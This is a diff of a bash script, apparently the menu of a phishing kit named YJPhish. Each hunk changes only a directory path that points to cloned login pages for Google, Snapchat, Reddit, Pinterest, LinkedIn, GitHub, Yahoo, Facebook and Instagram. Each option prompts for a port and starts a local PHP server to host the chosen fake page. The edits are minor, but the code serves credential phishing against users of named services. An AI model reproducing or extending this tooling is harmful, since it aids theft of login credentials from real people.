@@ -41,7 +41,7 @@ read yenoj
 case "$yenoj" in
 1)echo " "
 if [ $yenoj='1' ] ; then
-postion='YJPhish/sites/google'
+postion='sites/google'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -58,7 +58,7 @@ bash YJP.sh ;;
 
 2)echo " "
 if [ $yenoj='2' ] ; then
-postion='YJPhish/sites/snapchat'
+postion='sites/snapchat'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -75,7 +75,7 @@ bash YJP.sh ;;
 
 3)echo " "
 if [ $yenoj='3' ] ; then
-postion='YJPhish/sites/reddit'
+postion='sites/reddit'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -92,7 +92,7 @@ bash YJP.sh ;;
 
 4)echo " "
 if [ $yenoj='4' ] ; then
-postion='YJPhish/sites/pinterest'
+postion='sites/pinterest'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -109,7 +109,7 @@ bash YJP.sh ;;
 
 5)echo " "
 if [ $yenoj='5' ] ; then
-postion='YJPhish/sites/linkedin'
+postion='sites/linkedin'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -126,7 +126,7 @@ bash YJP.sh ;;
 
 6)echo " "
 if [ $yenoj='6' ] ; then
-postion='YJPhish/sites/github'
+postion='sites/github'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -143,7 +143,7 @@ bash YJP.sh ;;
 
 7)echo " "
 if [ $yenoj='7' ] ; then
-postion='YJPhish/sites/yahoo'
+postion='sites/yahoo'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -160,7 +160,7 @@ bash YJP.sh ;;
 
 8)echo " "
 if [ $yenoj='8' ] ; then
-postion='YJPhish/sites/facebook'
+postion='sites/facebook'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -177,7 +177,7 @@ bash YJP.sh ;;
 
 9)echo " "
 if [ $yenoj='9' ] ; then
-postion='YJPhish/sites/instagram'
+postion='sites/instagram'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
